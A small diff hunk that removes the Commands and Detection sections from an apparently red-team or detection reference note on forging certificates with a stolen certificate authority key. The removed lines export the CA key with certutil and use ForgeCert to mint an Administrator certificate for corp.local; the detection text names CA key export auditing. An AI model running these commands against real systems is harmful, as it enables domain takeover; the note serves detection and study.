@@ -21,15 +21,3 @@ tag: null
 
 ### Commands
 ```bash
-# ── On the CA host ───────────────────────────────────────────────────
-certutil -backupKey C:\backup
-# Then use ForgeCert to forge certificates offline.
-ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword p \
-  --Subject "CN=Administrator" \
-  --SubjectAltName administrator@corp.local --NewCertPath admin.pfx
-```
-
-### Detection
-CertSvc config registry writes; CA key export audit (`certutil -backup`).
-
----
